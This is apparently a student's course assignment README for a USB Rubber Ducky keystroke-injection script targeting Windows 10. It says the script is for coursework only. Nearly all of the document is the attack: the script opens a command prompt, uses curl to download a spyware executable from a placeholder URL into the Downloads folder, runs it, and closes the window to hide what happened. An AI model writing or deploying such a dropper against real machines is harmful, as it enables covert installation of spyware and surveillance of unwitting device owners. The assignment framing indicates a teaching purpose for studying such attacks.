# Spyware Installer - Windows 10
## Hassan Chadad
## CS-683 USB Rubber Ducky Assignment

This ducky script will download a spyware that I created from a url and run it<br/>
Steps to write the script:
1. Open cmd
2. Go to Downloads Folder
3. Download the spyware from URL
4. Run the SPyware
7. Close the cmd

**This script is tended to be for the course's assignment and I don't aim to use it harm or do any real attacks.**

```
REM ---------Open start Menu---------
CONTROL ESCAPE
DELAY 500
REM ---------Type cmd---------
STRING cmd 
DELAY 300
REM ---------Open cmd---------
ENTER
DELAY 1000
REM ---------Go To Downloads Folder---------
STRING cd Downloads
ENTER
DELAY 500
REM ---------Download Spyware from URL---------
STRING curl http://linkWhereIuploadedTheSpyware.exe --output spicy.exe
ENTER
DELAY 10000
REM ---------Start Spyware---------
STRING start spicy.exe
DELAY 3000
REM ---------close cmd---------
ALT F4
```